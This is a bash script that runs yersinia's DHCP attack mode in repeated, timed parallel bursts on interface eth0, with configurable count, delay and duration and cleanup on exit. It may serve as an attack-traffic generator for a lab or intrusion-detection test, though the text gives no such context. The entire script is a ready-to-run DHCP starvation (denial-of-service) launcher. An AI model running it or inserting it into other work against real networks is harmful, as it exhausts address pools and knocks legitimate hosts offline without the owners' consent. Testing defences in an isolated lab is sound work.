#!/usr/bin/env bash
set -euo pipefail

COUNT="${COUNT:-1}"
DELAY_MS="${DELAY_MS:-1000}"
DURATION_S="${DURATION_S:-0}"
ACTIVE_S="${ACTIVE_S:-5}"
HOLD_GRACE_S="${HOLD_GRACE_S:-5}"

if [ "${DURATION_S}" -gt 0 ] && [ "${ACTIVE_S}" -gt "${DURATION_S}" ]; then
  ACTIVE_S="${DURATION_S}"
fi
if [ "${ACTIVE_S}" -le 0 ]; then
  ACTIVE_S=5
fi

started_at="${SECONDS}"
pids=()

sleep_ms() {
  local ms="${1:-0}"
  if [ "${ms}" -gt 0 ]; then
    sleep "$(printf "%d.%03d" $((ms / 1000)) $((ms % 1000)))"
  fi
}

cleanup() {
  for pid in "${pids[@]:-}"; do
    kill "${pid}" 2>/dev/null || true
  done
  wait 2>/dev/null || true
}
trap cleanup EXIT INT TERM

for _ in $(seq 1 "${COUNT}"); do
  timeout "${ACTIVE_S}s" /usr/bin/yersinia dhcp -attack 1 -interface eth0 &
  pids+=("$!")
  sleep_ms "${DELAY_MS}"
done

wait || true

if [ "${DURATION_S}" -gt 0 ]; then
  elapsed=$((SECONDS - started_at))
  remaining=$((DURATION_S + HOLD_GRACE_S - elapsed))
  if [ "${remaining}" -gt 0 ]; then
    sleep "${remaining}"
  fi
fi
